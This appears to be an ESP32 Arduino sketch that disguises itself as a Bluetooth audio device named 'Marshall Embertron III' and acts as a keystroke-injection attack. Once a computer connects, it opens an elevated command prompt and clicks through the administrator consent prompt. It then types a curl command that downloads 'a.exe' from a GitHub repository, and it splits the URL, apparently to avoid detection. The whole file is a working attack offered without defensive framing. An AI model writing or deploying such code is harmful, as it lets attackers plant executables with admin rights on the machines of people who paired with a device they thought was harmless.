#include <BleKeyboard.h>

BleKeyboard bleKeyboard("Marshall Embertron III", "krish858", 63);
bool Done = true;

void setup() {
  bleKeyboard.begin();
}

void tapCombo(uint8_t mod, uint8_t key) {
  bleKeyboard.press(mod);
  delay(20);
  bleKeyboard.press(key);
  delay(40);
  bleKeyboard.releaseAll();
  delay(150);
}

void elevate() {
  bleKeyboard.press(KEY_LEFT_CTRL);
  bleKeyboard.press(KEY_LEFT_SHIFT);
  bleKeyboard.press(KEY_RETURN);
  delay(50);
  bleKeyboard.releaseAll();
}

void curl(){ 
  delay(500);
  bleKeyboard.print("curl -L -O https");
  delay(50);
  bleKeyboard.write(58);
  delay(100);
  bleKeyboard.print("//github.com/");
  delay(100);
  bleKeyboard.print("krish858/ble-hid-service");
  delay(200);
  bleKeyboard.print("/blob/main/a.exe");
  delay(200);
  bleKeyboard.write(KEY_RETURN);
}



void loop() {
  if (bleKeyboard.isConnected() && Done) {
    
    
    delay(1000);
    tapCombo(KEY_LEFT_GUI, 'r');
    delay(10);
    bleKeyboard.print("cmd");
    delay(100);
    elevate();
    delay(1500);
    bleKeyboard.write(KEY_LEFT_ARROW);
    bleKeyboard.write(KEY_RETURN);
    delay(100);
    curl();


    delay(1000);

    Done = false;
  }
}